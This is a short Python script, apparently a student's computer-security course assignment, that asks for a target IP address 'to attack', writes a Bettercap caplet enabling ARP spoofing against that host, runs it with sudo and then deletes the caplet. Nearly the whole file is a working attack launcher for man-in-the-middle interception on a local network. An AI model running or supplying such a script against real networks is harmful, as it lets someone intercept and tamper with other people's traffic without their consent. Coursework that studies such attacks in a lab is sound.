#Aldo Alcántara Martínez  Boleta:2019630578  Grupo:6CV2
#Materia:GOBIERNO DE TI|COMPUTER SECURITY

import os

def run_command(command):
    os.system(command)

# Solicitar la IP de la computadora objetivo
target_ip = input("Introduce la IP de la computadora a atacar: ")

#Bettercap
commands = f"""
set arp.spoof.targets {target_ip}
arp.spoof on
"""

# Crear un script de Bettercap
with open("bettercap_script.cap", "w") as script_file:
    script_file.write(commands)

# Ejecutar
run_command("sudo bettercap -caplet bettercap_script.cap")

# Eliminar el archivo de script
os.remove("bettercap_script.cap")
